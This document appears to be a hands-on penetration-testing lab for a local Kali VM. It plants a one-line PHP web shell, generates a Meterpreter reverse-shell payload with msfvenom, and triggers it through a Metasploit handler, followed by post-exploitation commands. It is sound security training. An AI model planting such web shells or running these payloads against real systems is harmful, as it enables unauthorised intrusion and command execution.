# Full Penetration Test Simulation Lab

## Estimated Time Needed: 20 minutes

## Lab Type: Local VM-based Simulation  
**Environment:** Kali Linux VM (Attacker), Simulated Local Users (Victims)

---

## Overview

This lab simulates a full internal penetration test from an attacker's perspective using Metasploit. You'll set up a Kali Linux VM, create simulated vulnerable targets on the same system, execute attacks, and practice documenting your findings. This mirrors the operations of internal Red Teams conducting penetration testing.

---

## Learning Objectives

By the end of this lab, you will be able to:

- Prepare a local penetration testing environment
- Simulate internal victims and services
- Perform reconnaissance and exploitation using Metasploit
- Capture Meterpreter sessions and conduct post-exploitation
- Document findings professionally

---

## Step 1: Prepare the Environment

1. **Update and install necessary tools**  
   In your Kali VM terminal, run the following commands:

```
   sudo apt update
   sudo apt install -y ruby-full nmap netcat-traditional iproute2 php
```

**Why this matters:**
Preparing the environment ensures your tools are updated and installed correctly, providing a solid foundation for future actions in the penetration test.

---

## Step 2: Simulate Victim Users and Services

1. **Create victim users and a simulated vulnerable web app:**

   ```
   sudo adduser victim --disabled-password --gecos ""
   sudo adduser webuser --disabled-password --gecos ""
   sudo mkdir -p /home/webuser/web/uploads
   echo '<?php system($_GET["cmd"]); ?>' | sudo tee /home/webuser/web/uploads/upload.php
   echo "FLAG{simulated_web_flag}" | sudo tee /home/webuser/web/uploads/flag.txt
   sudo chown -R webuser:webuser /home/webuser/web
   ```

2. **Create and interact with a fake Echo server:**

   2.1 **Create the server script:**

   ```bash
   sudo tee /home/victim/fake_service.py > /dev/null << 'EOF'
   #!/usr/bin/env python3
   import socketserver
   class EchoHandler(socketserver.BaseRequestHandler):
       def handle(self):
           self.request.sendall(b"Welcome to Echo Service\r\n")
           while True:
               data = self.request.recv(1024)
               if not data:
                   break
               self.request.sendall(b"ECHO: " + data)
   if __name__ == "__main__":
       with socketserver.TCPServer(("0.0.0.0", 9003), EchoHandler) as server:
           server.serve_forever()
   EOF
   ```

   2.2 **Make it executable and run:**

   ```bash
   sudo chmod +x /home/victim/fake_service.py
   sudo chown victim:victim /home/victim/fake_service.py
   sudo -u victim nohup python3 /home/victim/fake_service.py > /tmp/fake_service.log 2>&1 &
   ```

   2.3 **Test the Echo service behavior:**

   ```bash
   nc 127.0.0.1 9003
   ```

   Type any message to see how it's echoed back.

   ```bash
   hi
   ECHO: hi
   how are you
   ECHO: how are you
   ```

   **Why this matters:**
   Simulating internal users and services models a real-world environment for penetration testers to identify exploitable vulnerabilities.

---

## Step 3: Perform Reconnaissance

1. **Scan the local system for open services:**

   ```bash
   nmap -p 22,8080,9003 127.0.0.1
   ```

2. **Analyze the output**
   Look for service banners or misconfigurations that could lead to potential exploits.

   **Why this matters:**
   Reconnaissance is the first step in any penetration test. It helps attackers identify open ports, services, and weak points to target for further exploitation.

---

## Step 4: Exploit a Vulnerable Web App

1. **Generate a Meterpreter reverse shell in PHP:**

   ```bash
   msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4443 -f raw -o shell.php
   sudo cp shell.php /home/webuser/web/uploads/shell.php
   sudo chown webuser:webuser /home/webuser/web/uploads/shell.php
   ```

2. **Start Metasploit:**

   ```bash
   msfconsole
   ```

3. **Set up the Metasploit handler:**

   ```bash
   use exploit/multi/handler
   set PAYLOAD php/meterpreter/reverse_tcp
   set LHOST 127.0.0.1
   set LPORT 4443
   run
   ```

4. **Start the PHP web server:**

   ```bash
   sudo -u webuser php -S 127.0.0.1:8080 -t /home/webuser/web/uploads
   ```

5. **Trigger the reverse shell:**

   ```bash
   curl http://127.0.0.1:8080/shell.php
   ```

---

## Step 5: Post-exploitation

1. **Inside Meterpreter:**

   * `sysinfo`
   * `getuid`
   * `ls`
   * `cat flag.txt`

2. **Drop to a shell:**

   ```bash
   shell
   whoami
   id
   uname -a
   ```

---

## Step 6: Document Your Work

1. **Create a professional penetration testing report.**
   Your report should include:

   * Executive summary
   * Scope and methodology
   * Vulnerabilities found (with proof: logs, screenshots, CVSS score)
   * Exploitation steps
   * Post-exploitation findings
   * Remediation advice

---

## Challenge (Optional)

Identify one way to escalate privileges from a standard user (e.g., victim) to root using only local techniques.
**Hint:** Check sudo permissions, SUID binaries, or misconfigurations.

---

## Cleanup

1. **Stop services:**

   ```bash
   sudo pkill -f php
   sudo pkill -f msfconsole
   sudo pkill -f ruby
   sudo pkill -f fake_service
   ```

2. **Remove simulated users and files:**

   ```bash
   sudo deluser --remove-home victim
   sudo deluser --remove-home webuser
   ```
